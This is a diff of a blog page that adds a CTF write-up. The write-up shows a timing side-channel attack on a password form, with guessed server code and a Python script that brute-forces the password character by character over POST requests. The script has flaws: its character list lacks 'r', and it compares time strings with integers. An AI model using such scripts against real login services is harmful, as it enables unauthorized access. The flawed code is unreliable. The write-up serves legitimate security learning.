@@ -99,7 +99,7 @@ Guessing Word challenge description
 DISCLAIMER: This is the solution to the challenge, I recommed you to try it yourself first.
 ",
   "inLanguage" : "en",
-  "wordCount": 424,
+  "wordCount": 765,
   "datePublished" : "2018-12-23T08:02:11",
   "dateModified" : "2018-12-23T08:02:11",
   "image" : "https://erbazz.github.io",
@@ -508,7 +508,145 @@ We need to do something with the input of the form, one of the possibilities wou
 </div>
 </div>
 
-<p>A comment telling us the process time!</p>
+<p>A comment telling us the process time! After several tries, we have found out that different inputs yield different processing times, and we can deduct the correct password from the processing time.</p>
+
+<p>The code would probably look somewhat like this:</p>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">correct_pass</span> <span class="o">=</span> <span class="s2">&#34;P@ssw0rd&#34;</span>
+<span class="nb">input</span> <span class="o">=</span> <span class="p">[</span><span class="n">User</span> <span class="nb">input</span><span class="p">]</span>
+
+<span class="n">wrong</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="c1"># Different input sizes yield equal processing time, so it is probably made to be easy to crack.</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">correct_pass</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">))):</span>
+  <span class="k">if</span> <span class="n">correct_pass</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">input</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+    <span class="n">wrong</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">break</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">correct_pass</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
+  <span class="n">wrong</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="k">if</span> <span class="err">!</span><span class="n">wrong</span><span class="p">:</span>
+  <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Correct Password&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Wrong Password&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+
+<p>With this code, the program would run longer if more characters of the input matches the correct password. Therefore, we can bruteforce it character by character and pick the one with the longest processing time.</p>
+
+<p>I wrote a simple Python script to send POST requests and bruteforce the password.</p>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://game.rop.sh/chall/5/index.php?debug&#34;</span>
+  
+<span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+<span class="n">charlist</span> <span class="o">=</span> <span class="s2">&#34;0123456789abcdefghijklmnopqustuvwxyz!@#$%^&amp;*()_-+=&#34;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+    <span class="n">maxtime</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">tempchar</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">end</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charlist</span><span class="p">:</span>
+        <span class="n">temppass</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">temppass</span><span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;password&#34;</span><span class="p">:</span><span class="n">temppass</span><span class="p">})</span>
+        
+        <span class="n">wrong</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Wrong&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">wrong</span><span class="p">:</span>
+            <span class="n">tempchar</span> <span class="o">=</span> <span class="n">c</span>
+            <span class="n">end</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+
+        <span class="n">find</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Process Time: ([\d\.]+)&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">find</span><span class="p">:</span>
+            <span class="n">time</span> <span class="o">=</span> <span class="n">find</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">time</span> <span class="o">&gt;</span> <span class="n">maxtime</span><span class="p">:</span>
+                <span class="n">maxtime</span> <span class="o">=</span> <span class="n">time</span>
+                <span class="n">tempchar</span> <span class="o">=</span> <span class="n">c</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">tempchar</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">end</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Key = &#34;</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+
+<p>The script would rotate the characters from the list to send as an input, after that, it would save the one with the longest process time and pick the further characters.</p>
+
+<p>After waiting for a while, we got our password.</p>
+
+<p><img src="/images/rop/05/rop_05_output.png" alt="Script Output" /><center><em>Script Output</em></center></p>
+
+<p>Inputting this key manually on the website yields this result:</p>
+
+<p><img src="/images/rop/05/rop_05_key.png" alt="Result" /><center><em>Result</em></center></p>
+
+<p>Success!</p>
 
         
           <div class="blog-tags">
